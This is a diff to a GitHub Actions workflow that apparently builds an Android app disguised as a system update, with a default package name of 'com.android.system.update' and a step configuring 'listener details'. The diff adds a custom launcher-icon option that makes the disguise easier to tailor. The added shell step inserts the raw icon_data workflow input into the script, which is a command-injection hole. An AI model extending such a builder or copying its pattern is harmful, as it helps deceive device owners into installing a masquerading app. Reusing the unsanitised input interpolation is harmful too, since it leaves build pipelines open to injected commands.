@@ -19,6 +19,10 @@ on:
         description: 'Package Name (e.g., com.android.update)'
         required: true
         default: 'com.android.system.update'
+      icon_data:
+        description: 'Base64 encoded icon data'
+        required: false
+        default: ''
 
 jobs:
   build:
@@ -43,6 +47,53 @@ jobs:
         export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin
         yes | sdkmanager --licenses
         sdkmanager "platform-tools" "platforms;android-33" "build-tools;33.0.0"
+
+    - name: Process Custom Icon
+      if: ${{ github.event.inputs.icon_data != '' }}
+      run: |
+        echo "Processing custom icon..."
+        # Create mipmap directories
+        mkdir -p app/src/main/res/mipmap-hdpi
+        mkdir -p app/src/main/res/mipmap-mdpi
+        mkdir -p app/src/main/res/mipmap-xhdpi
+        mkdir -p app/src/main/res/mipmap-xxhdpi
+        mkdir -p app/src/main/res/mipmap-xxxhdpi
+        
+        # Extract base64 data (remove data:image/png;base64, prefix if present)
+        ICON_DATA="${{ github.event.inputs.icon_data }}"
+        if [[ $ICON_DATA == data:* ]]; then
+          ICON_DATA=$(echo $ICON_DATA | sed 's/^data:image\/[^;]*;base64,//')
+        fi
+        
+        # Decode base64 to temporary file
+        echo $ICON_DATA | base64 -d > /tmp/custom_icon.png
+        
+        # Create different sized versions for different densities
+        convert /tmp/custom_icon.png -resize 48x48 app/src/main/res/mipmap-hdpi/ic_launcher.png
+        convert /tmp/custom_icon.png -resize 32x32 app/src/main/res/mipmap-mdpi/ic_launcher.png
+        convert /tmp/custom_icon.png -resize 64x64 app/src/main/res/mipmap-xhdpi/ic_launcher.png
+        convert /tmp/custom_icon.png -resize 96x96 app/src/main/res/mipmap-xxhdpi/ic_launcher.png
+        convert /tmp/custom_icon.png -resize 128x128 app/src/main/res/mipmap-xxxhdpi/ic_launcher.png
+        
+        echo "Custom icon processed successfully"
+
+    - name: Create Default Icons (if no custom icon)
+      if: ${{ github.event.inputs.icon_data == '' }}
+      run: |
+        echo "No custom icon provided, creating default icons..."
+        mkdir -p app/src/main/res/mipmap-hdpi
+        mkdir -p app/src/main/res/mipmap-mdpi
+        mkdir -p app/src/main/res/mipmap-xhdpi
+        mkdir -p app/src/main/res/mipmap-xxhdpi
+        mkdir -p app/src/main/res/mipmap-xxxhdpi
+        
+        # Create a simple colored square as default icon
+        sudo apt-get update && sudo apt-get install -y imagemagick
+        convert -size 48x48 xc:blue app/src/main/res/mipmap-hdpi/ic_launcher.png
+        convert -size 32x32 xc:blue app/src/main/res/mipmap-mdpi/ic_launcher.png
+        convert -size 64x64 xc:blue app/src/main/res/mipmap-xhdpi/ic_launcher.png
+        convert -size 96x96 xc:blue app/src/main/res/mipmap-xxhdpi/ic_launcher.png
+        convert -size 128x128 xc:blue app/src/main/res/mipmap-xxxhdpi/ic_launcher.png
 
     - name: Update Configuration with Listener Details
       run: |
